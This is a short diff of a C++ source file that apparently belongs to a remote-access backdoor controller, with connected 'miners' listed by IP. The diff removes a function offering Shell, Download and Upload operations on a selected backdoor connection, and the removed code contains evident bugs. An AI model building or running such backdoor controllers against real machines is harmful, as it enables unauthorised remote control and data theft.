@@ -1,36 +1,10 @@
+#include <iostream>
 #include "communication.h"
 #include "backdoor.h"
 #define IP "127.0.0.1"
 #define PORT 8000
 
-void operar(Backdoor b){
-    int choice;
-    std::cout << "MINER_ID = " << b.get_miner_id() << "IP = \n" << b.get_miner_ip() << std::endl;
-0
-    std::cout << "Operações : " << std::endl;
 
-    std::cout << "1) Shell\n2) Download\n3)Upload" << std::endl;
-
-    choice = std::cin.get();
-
-
-    if(choice == 1){
-        b.shell();
-    
-    }else if(choice == 2){
-        char * path;
-        b.download(path);
-
-
-    }else if(choice == 3){
-        char *path;
-    
-        b.upload(path);
-    
-    }else{
-        std::cout << "Comando inválido" << std::endl;
-    }
-}
 
 
 int main(int argc, char *argv[]){
@@ -48,8 +22,6 @@ int main(int argc, char *argv[]){
         std::cout << b.get_miner_ip() << std::endl;
         choice = std::cin.get();
     }
-
-    operar(conexoes[choice]);
 
 
     Communication c(IP, PORT);
